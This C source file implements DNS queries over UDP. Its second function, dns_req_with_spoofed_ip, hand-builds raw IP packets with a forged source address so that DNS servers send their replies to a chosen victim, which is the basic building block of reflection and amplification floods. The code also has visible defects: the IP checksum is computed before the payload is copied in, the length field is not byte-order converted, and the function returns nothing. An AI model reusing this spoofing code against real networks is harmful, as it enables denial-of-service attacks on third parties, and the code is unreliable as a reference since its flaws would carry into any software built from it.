//
// Created by Marcin Skwarek on 11.03.2018.
//

#include <string.h>
#include <sys/socket.h> //you know what this is for
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <stdlib.h>

#include "../inc/dns_udp.h"
#include "utils.h"

unsigned short csum(unsigned short *buf, int nwords){
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

dns_result dns_udp_req(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qinfo,
    unsigned int to, char *host, char *buf, int query_type, const char *server)
{
    int s = -1;
    struct sockaddr_in dest = {0};

    feel_dns_header_req(&dns->header);

    // point to the query portion
    qname = (unsigned char *)&buf[sizeof(struct DNS_UDP_HEADER)];
    ChangetoDnsNameFormat(qname, (unsigned char *)host);
    qinfo = (struct QUESTION
            *)&buf[sizeof(struct DNS_UDP_HEADER) + (strlen((const char *)qname) + 1)]; // fill it
    qinfo->qtype = htons(query_type); // type of the query , A , MX , CNAME , NS etc
    qinfo->qclass = htons(1);

    int i = 0;
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); // UDP packet for DNS queries
    if (s < 0)
    {
        // printf("Conn refused\n");
        close(s);
        return DNS_RESULT_CONN_REFUSED;
    }

    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(server);

    struct timeval tv = {0};
    tv.tv_sec = to;
    int setopterr = setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));
    if (setopterr < 0)
    {
        // perror("Error");
        // printf("err: %d\n", setopterr);
        // printf("setsockopt failed");
        return DNS_RESULT_SOCKET_ERR;
    }

    int len = (unsigned int)sizeof(struct DNS_UDP_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION);

    // printf("\nSending Packet...");
    if( 0 > sendto(s,(char*)buf,len,0,(struct sockaddr*)&dest,sizeof(dest)) )
    {
        printf("sendto failed");
        close(s);
	    return DNS_RESULT_ERR;
    }
    // printf("Done");

    //Receive the answer
    i = sizeof dest;
    // printf("\nReceiving answer...");
    if(recvfrom (s, (char*)buf , 65536 , 0 , (struct sockaddr*)&dest , (socklen_t*)&i ) < 0)
    {
        //perror("recvfrom failed");
        close(s);
	    printf("recvfrom failed");
        return DNS_RESULT_ERR;
    }
    // printf("Done");
    close(s);
    return DNS_RESULT_OK;
}

dns_result dns_req_with_spoofed_ip(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qinfo, char* host, char* buf,
    int query_type, const char *server, const char *spoofed_ip)
{
    printf("Start spoofing\n");
    int s = -1;
    struct sockaddr_in dest = {0};
    char datagram[sizeof(struct ip)+sizeof(struct udphdr)+sizeof(struct DNS_UDP_HEADER)+65536] = {0};

    feel_dns_header_req(&dns->header);

    //point to the query portion
    qname =(unsigned char*)&buf[sizeof(struct DNS_UDP_HEADER)];
    ChangetoDnsNameFormat(qname , (unsigned char*)host);
    qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_UDP_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
    qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
    qinfo->qclass = htons(1);

    int i = 0;
    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //UDP packet for DNS queries SOCK_RAW, IPPROTO_RAW
    if(s<0)
    {
        printf("Conn refused\n");
        close(s);
        return DNS_RESULT_ERR;
    }

    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(server);

    int len = (unsigned int)sizeof(struct DNS_UDP_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION);

    struct ip *ip_hdr = (struct ip *) datagram;
    struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));

    ip_hdr->ip_hl = 5; //header length
    ip_hdr->ip_v = 4; //version
    ip_hdr->ip_tos = 0; //tos
    ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + len;  //length
    ip_hdr->ip_id = 0; //id
    ip_hdr->ip_off = 0; //fragment offset
    ip_hdr->ip_ttl = 255; //ttl
    ip_hdr->ip_p = 17; //protocol
    ip_hdr->ip_sum = 0; //temp checksum
    ip_hdr->ip_src.s_addr = inet_addr (spoofed_ip); //src ip - spoofed
    ip_hdr->ip_dst.s_addr = inet_addr(server); //dst ip

    srand(time(NULL));   // Initialization, should only be called once.
    int r = rand()%64511;
    udp_hdr->source = htons(r+1025);
    udp_hdr->dest = htons(53); //srand(time(NULL)) % 65536; //dst port
    udp_hdr->len = htons(sizeof(struct udphdr) + len); //length
    udp_hdr->check = 0; //checksum - disabled

    ip_hdr->ip_sum = csum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
    memcpy(datagram+sizeof(struct ip)+sizeof(struct udphdr), buf, len);
    len += sizeof(struct ip);
    len += sizeof(struct udphdr);
    int on = 1;
    if( setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ) {
        perror("[-] Error! Cannot set IP_HDRINCL");
        return DNS_RESULT_ERR;
    }

    /* send spoofed packet (set routing flags to 0) */
    if(sendto(s, datagram, len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0){
        printf("sendto failed");
        close(s);
        return DNS_RESULT_SEND_ERR;
    }
    // else
    //     printf( "[+] Spoofed IP packet sent successfully!\n");

    close(s);
}
